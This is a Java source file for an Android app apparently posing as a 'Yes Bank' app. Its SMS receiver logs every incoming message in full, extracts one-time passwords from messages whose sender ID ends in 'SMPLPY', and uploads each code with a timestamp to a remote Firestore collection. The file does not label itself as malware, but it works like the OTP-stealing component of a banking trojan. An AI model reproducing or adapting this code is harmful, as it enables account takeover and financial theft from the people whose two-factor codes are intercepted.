package com.example.yesbankapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {

    public interface OTPListener {
        void onOTPReceived(String otp);
    }

    private static OTPListener otpListener;

    // Bind the listener to the activity
    public static void bindListener(OTPListener listener) {
        otpListener = listener;
    }

    private static final String TAG = "SmsReceiver";
    private static final String OTP_KEYWORD = "OTP"; // Keyword to identify the correct message
    private static final String FIXED_PART = "SMPLPY"; // Fixed part of the sender ID

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        if (data != null) {
            Object[] pdus = (Object[]) data.get("pdus");
            String format = intent.getStringExtra("format");

            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                    String messageBody = smsMessage.getMessageBody();
                    String sender = smsMessage.getDisplayOriginatingAddress();

                    Log.d(TAG, "Message from: " + sender);
                    Log.d(TAG, "Message content: " + messageBody);

                    // Normalize the sender ID by removing hyphens and checking if it ends with the fixed part
                    String normalizedSender = sender.replace("-", "");
                    if (normalizedSender.endsWith(FIXED_PART) && messageBody.contains(OTP_KEYWORD)) {
                        String otp = extractOTP(messageBody);

                        // Trigger the OTPListener callback if OTP is extracted
                        if (otpListener != null) {
                            otpListener.onOTPReceived(otp); // Notify the listener
                        } else {
                            Log.w(TAG, "OTPListener is not set. Unable to notify listener.");
                        }
                        storeOTPInFirestore(otp); // Store OTP in Firestore
                        showPopup(context, otp); // Show popup with OTP details
                    }
                }
            }
        }
    }

    // Extract OTP from the message
    private String extractOTP(String message) {
        String otp = null;

        // Regex to capture a 4-6 digit numeric OTP (e.g., 8686)
        String otpPattern = "\\b\\d{4,6}\\b";

        // Use regex to find a match
        Pattern pattern = Pattern.compile(otpPattern);
        Matcher matcher = pattern.matcher(message);

        if (matcher.find()) {
            otp = matcher.group(0); // Get the first match (OTP)
        } else {
            Log.d(TAG, "No OTP found in the message.");
        }

        return otp;
    }

    // Store OTP in Firestore
    public void storeOTPInFirestore(String otp) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        // Create a map to hold the OTP details
        Map<String, Object> otpData = new HashMap<>();
        otpData.put("otp", otp);

        // Get current timestamp
        long currentTimestamp = System.currentTimeMillis();

        // Convert timestamp to readable format
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
        String formattedDate = sdf.format(new Date(currentTimestamp));

        // Add the readable timestamp to the data
        otpData.put("timestamp", formattedDate);

        // Add the OTP data to Firestore under a unique document
        db.collection("otps")
                .add(otpData)
                .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                    @Override
                    public void onSuccess(DocumentReference documentReference) {
                        Log.d(TAG, "OTP stored in Firestore with ID: " + documentReference.getId());
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.w(TAG, "Error adding OTP to Firestore", e);
                    }
                });
    }

    private void showPopup(Context context, String otp) {
        // Implementation for showing a popup with OTP
        Toast.makeText(context, "OTP: " + otp, Toast.LENGTH_LONG).show();
    }
}
